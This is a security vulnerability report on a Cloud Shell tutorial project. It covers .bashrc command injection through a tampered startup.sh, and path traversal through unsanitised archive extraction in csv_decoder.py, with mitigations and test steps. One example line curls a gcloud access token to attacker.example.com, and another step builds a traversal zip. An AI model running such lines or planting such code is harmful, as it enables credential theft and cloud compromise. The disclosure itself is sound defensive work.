### Vulnerability 1: Malicious .bashrc modification in startup.sh

- Description:
    1. A malicious actor forks the repository.
    2. The attacker modifies the `startup.sh` script in the forked repository to replace the legitimate `PATH` modification command with a malicious command injection into the `.bashrc` file. For example, the attacker could replace `echo "PATH=\$PATH:$HOME/.local/bin" >> $HOME/.bashrc` with `echo "echo 'Vulnerable' > /tmp/vulnerable.txt" >> $HOME/.bashrc`.
    3. The attacker convinces a victim user to use the modified tutorial from the forked repository. This could be achieved through social engineering techniques, such as sharing a link to the forked repository with misleading instructions.
    4. The victim user, believing they are following the legitimate tutorial, clicks the "Open in Cloud Shell" button in the modified README.md, which points to the forked repository and tutorial.
    5. The victim user executes the command `source startup.sh <your-project-id>` in their Cloud Shell as instructed by the tutorial.
    6. The modified `startup.sh` script executes, appending the attacker's malicious command (`echo 'Vulnerable' > /tmp/vulnerable.txt` in this example) to the victim's `.bashrc` file.
    7. Every time the victim starts a new Cloud Shell session, the commands in `.bashrc` are executed, including the attacker's injected command. In this example, it will create a file `/tmp/vulnerable.txt` with the content "Vulnerable". A more sophisticated attack could involve data exfiltration or further malicious actions.

- Impact:
    - Arbitrary command execution in the user's Cloud Shell environment upon each new session start.
    - Potential for persistent compromise of the user's Cloud Shell environment.
    - Possible data exfiltration from the Cloud Shell environment.
    - Potential for credential theft if malicious commands are designed to steal credentials.
    - Further compromise of the user's Google Cloud project depending on the malicious commands injected.

- Vulnerability rank: High

- Currently implemented mitigations:
    - None. The project does not currently implement any mitigations against malicious modification of `startup.sh`.

- Missing mitigations:
    - **Avoid modifying `.bashrc`**: The most effective mitigation is to avoid modifying the user's `.bashrc` file altogether. If modifying the `PATH` is necessary, consider alternative methods that do not involve persistent changes to shell configuration files, or provide clear instructions for manual configuration instead of automated modification.
    - **Warning to user**: If modifying `.bashrc` is deemed absolutely necessary, implement a clear warning message in `startup.sh` that informs the user about the `.bashrc` modification and the potential security implications, especially when using scripts from untrusted sources.
    - **Input validation (less relevant here)**: While input validation on the project ID might slightly reduce the attack surface in other parts of the script, it does not directly mitigate the `.bashrc` injection vulnerability.

- Preconditions:
    - The victim user must be socially engineered into using a forked and maliciously modified version of the repository.
    - The victim user must execute the `startup.sh` script from the malicious repository in their Cloud Shell.

- Source code analysis:
    - File: `/code/startup.sh`
    - Line:
    ```bash
    echo "PATH=\$PATH:$HOME/.local/bin" >> $HOME/.bashrc
    ```
    - This line appends the specified `PATH` modification command to the user's `.bashrc` file.
    - A malicious actor can replace this line with any arbitrary command injection, for example:
    ```bash
    echo "curl -X POST -d \$(gcloud auth print-access-token) https://attacker.example.com/steal-token" >> $HOME/.bashrc
    ```
    - When the user executes the modified `startup.sh`, this malicious `echo` command will append the command to exfiltrate the access token to the attacker's server to `.bashrc`.
    - Upon next Cloud Shell startup, `.bashrc` is sourced, and the malicious command will be executed, sending the access token to the attacker.

- Security test case:
    1. Fork the repository on GitHub.
    2. Edit the `/code/startup.sh` file in the forked repository. Replace the line `echo "PATH=\$PATH:$HOME/.local/bin" >> $HOME/.bashrc` with `echo "echo 'Vulnerable' > /tmp/vulnerable.txt" >> $HOME/.bashrc`. Commit the change.
    3. Create a new Google Cloud project for testing purposes.
    4. In your browser, navigate to the forked repository on GitHub.
    5. Click the "Open in Cloud Shell" button in the README.md of your forked repository. This will open a Cloud Shell session with the code from your forked repository.
    6. In the Cloud Shell terminal, execute the command: `source startup.sh <your-project-id>` (replace `<your-project-id>` with the ID of your test project).
    7. Close the current Cloud Shell session by typing `exit` and pressing Enter.
    8. Open a new Cloud Shell session.
    9. In the new Cloud Shell session, check if the file `/tmp/vulnerable.txt` exists and contains the text "Vulnerable" by running: `cat /tmp/vulnerable.txt`.
    10. If the file exists and contains "Vulnerable", the vulnerability is confirmed. This demonstrates that arbitrary commands can be injected into `.bashrc` via a modified `startup.sh` and will be executed in subsequent Cloud Shell sessions.

### Vulnerability 2: Path Traversal in Archive Extraction in csv_decoder.py

- Description:
    1. A malicious actor forks the repository.
    2. The attacker crafts a malicious archive file (ZIP or TAR) containing filenames with path traversal sequences, such as `../../../tmp/evil_file.txt`. This filename is designed to write a file outside of the intended extraction directory.
    3. The attacker modifies the `tutorial.md` in the forked repository to subtly encourage or trick the victim user into uploading this malicious archive file as historical data.
    4. The attacker convinces a victim user to use the modified tutorial from the forked repository (as described in Vulnerability 1).
    5. The victim user, following the tutorial, uploads the malicious archive file when prompted to provide historical data.
    6. The `csv_decoder.py` script, specifically the `TarfileDecoder` or `ZipfileDecoder` class, extracts the uploaded archive using `extractall()` without properly sanitizing filenames.
    7. Due to the path traversal sequences in the malicious filenames, files are extracted to locations outside the intended temporary extraction directory, potentially overwriting existing files or creating new files in arbitrary locations accessible by the Cloud Shell user. In this example, the file `evil_file.txt` would be written to `/tmp/evil_file.txt`.

- Impact:
    - Arbitrary file write within the Cloud Shell environment.
    - Potential to overwrite existing files if the attacker knows their paths.
    - Potential to place malicious files in accessible locations, which could be leveraged for further attacks, although limited within the Cloud Shell environment.
    - In the context of this tool, it could be used to overwrite configuration files within the project directory or place files that could be unintentionally included in BigQuery uploads.

- Vulnerability rank: Medium

- Currently implemented mitigations:
    - None. The `TarfileDecoder` and `ZipfileDecoder` classes use `extractall()` without any filename sanitization to prevent path traversal. Although a `safe_extract` function exists in `TarfileDecoder`, it is not used.

- Missing mitigations:
    - **Filename sanitization**: Implement filename sanitization during archive extraction to remove or replace path traversal sequences (e.g., "../", leading "/") from filenames before using them in `os.path.join()` or `extractall()`.
    - **Use `safe_extract`**: In `TarfileDecoder`, utilize the existing `safe_extract` function instead of `th.extractall()` to perform safer extraction that prevents path traversal.
    - **Principle of least privilege**: While not a direct code mitigation, ensure that the Cloud Shell environment and the tool itself operate with the least necessary privileges to limit the impact of arbitrary file write vulnerabilities.

- Preconditions:
    - The victim user must be socially engineered into using a forked and maliciously modified version of the repository.
    - The victim user must upload a maliciously crafted archive file (ZIP or TAR) as historical data.

- Source code analysis:
    - File: `/code/csv_decoder.py`
    - Class: `Decoder.TarfileDecoder` and `Decoder.ZipfileDecoder`
    - Method: `run()` in both classes uses `extractall()`:
    ```python
    class TarfileDecoder(AbstractDecoder):
        def run(self):
            with tarfile.open(self.path) as th:
                extraction_directory = '/tmp/tar-output-' + self.parent.time
                # ...
                th.extractall(extraction_directory)
                # ...

    class ZipfileDecoder(AbstractDecoder):
        def run(self):
            with zipfile.ZipFile(self.path, 'r') as zh:
                extraction_directory = '/tmp/zip-output-' + self.parent.time
                zh.extractall(extraction_directory)
                # ...
    ```
    - `extractall()` is known to be vulnerable to path traversal attacks if filenames within the archive are not sanitized. The code does not perform any sanitization.
    - In `TarfileDecoder`, a `safe_extract` function is defined but not used for extraction, indicating a potential awareness of path traversal risks that was not fully implemented.

- Security test case:
    1. Fork the repository on GitHub.
    2. Create a malicious ZIP archive file named `evil.zip`. Inside `evil.zip`, create a text file with the path and filename `../../../tmp/evil_file.txt` and content "Evil content". You can achieve this using command-line tools like `zip` (e.g., `zip evil.zip ../../../tmp/evil_file.txt`).
    3. Edit the `/code/docs/tutorial.md` file in your forked repository. Modify the "Historical Data" section to slightly alter the instructions to encourage uploading a zip file, or simply leave it as is, assuming users might upload zip files.
    4. Follow the README instructions to open Cloud Shell and clone your forked repository.
    5. Run the tutorial as instructed: `cloudshell launch-tutorial -d docs/tutorial.md`.
    6. When the tutorial reaches the "File Uploads" step and prompts for historical data, choose to upload a file and upload the `evil.zip` file you created.
    7. After the script execution completes, check if the file `/tmp/evil_file.txt` exists and contains the text "Evil content" by running: `cat /tmp/evil_file.txt`.
    8. If the file exists and contains "Evil content", the path traversal vulnerability is confirmed. This demonstrates that a malicious ZIP file can write files to arbitrary locations outside the intended extraction directory. Repeat the test with a TAR archive to confirm the vulnerability in `TarfileDecoder` as well.